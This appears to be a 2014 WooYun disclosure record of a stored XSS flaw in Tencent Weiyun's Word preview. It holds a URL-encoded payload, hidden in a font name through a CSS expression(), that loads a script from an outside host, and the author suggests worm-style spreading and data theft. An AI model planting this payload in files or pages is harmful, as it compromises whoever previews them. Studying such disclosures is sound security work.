{"id": 4395, "wybug_id": "wooyun-2014-054458", "wybug_title": "腾讯微云存储型xss漏洞", "wybug_corp": "腾讯", "wybug_author": "Peng s Blog", "wybug_date": "2014-03-24 15:41", "wybug_open_date": "2014-05-08 15:42", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向公众公开  简要描述： 这个的利用就是蠕虫，在word文档里添加隐藏的代码，别人转存、预览的时候就会被xss、盗资料等。需要提醒的是excel、ppt等文档的预览，我没有测试，但wps的轻办公已有该漏洞。 详细说明：  知道腾讯微云是在qq群里图片预览。 \n\n登陆网页版http://www.weiyun.com/disk/index.html发现能上传word，用的是http://www.yozosoft.com/office/fileconvert.jsp的office预览功能，本次重点测试该预览的过滤效果。word的内容为xss代码直接被编码，于是测试字体功能\n\n字体的名字有31字节限制，这个就是利用style 的expression。发现预览会自动把前170字节的内容作为title，这样把内容设为 unescape(\"%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%74%6D%78%6B%2E%6F%72%67%2F%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E\")字体设为expression(eval(document.title)) //32字节，长度不满足expression(eval($('title')) // 长度满足，但单引号、双引号被过滤，还是不行就可以xss了。但利用就在弹框框阶段。为了利用最大化，我想到了抓包和wps。我试了wps。wps重写了字体对话框，其复杂文中字体长度则不受限制。\n\n于是写一个文档，内容为%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%74%6D%78%6B%2E%6F%72%67%2F%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E复杂文中字体设为expression(document.write(unescape(document.title)))上传，在ie等的环境下，测试成功。\n\n   漏洞证明：  \n\n   修复方案：  你懂的   版权声明：转载请注明来源 Peng s Blog@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-25 10:26 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-24 21:01 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  简单描述 侧漏    \n     2014-03-25 10:12 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:21        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  简要即详细系列    \n     2014-03-25 21:46 |    \t\t小李子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 资深菜鸟，追求技术的纯粹，小玩叫折腾，大...)\t\t \n  0.0    \n     2014-05-08 16:34 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  QAQ 好厉害    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}